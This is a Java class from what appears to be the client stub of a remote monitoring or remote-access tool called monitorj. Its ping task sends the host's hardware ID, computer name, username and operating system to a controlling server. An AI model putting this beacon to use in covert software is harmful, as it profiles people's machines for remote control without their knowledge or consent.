package me.jershdervis.monitorj.stub.client.tasks;

import me.jershdervis.monitorj.stub.client.BaseClient;
import me.jershdervis.monitorj.stub.client.PacketTask;
import me.jershdervis.monitorj.stub.client.Packets;
import me.jershdervis.monitorj.stub.util.ClientSystemUtil;

import java.io.DataOutputStream;
import java.io.IOException;
import java.util.Locale;

/**
 * Created by Josh on 19/06/2015.
 */
public class PingTask extends PacketTask {

    public PingTask() {
        super(Packets.PING.getPacketID());
    }

    @Override
    public void run(BaseClient client) throws IOException {
        DataOutputStream dos = client.getDataOutputStream();
        client.getDataOutputStream().writeByte(Packets.PING.getPacketID()); //Tell the server to act on the ping packet
        dos.writeUTF(ClientSystemUtil.getHWID());
        dos.writeUTF(ClientSystemUtil.getComputerName());
        dos.writeUTF(ClientSystemUtil.getUsername());
        dos.writeUTF(System.getProperty("os.name", "generic").toLowerCase(Locale.ENGLISH));
    }
}
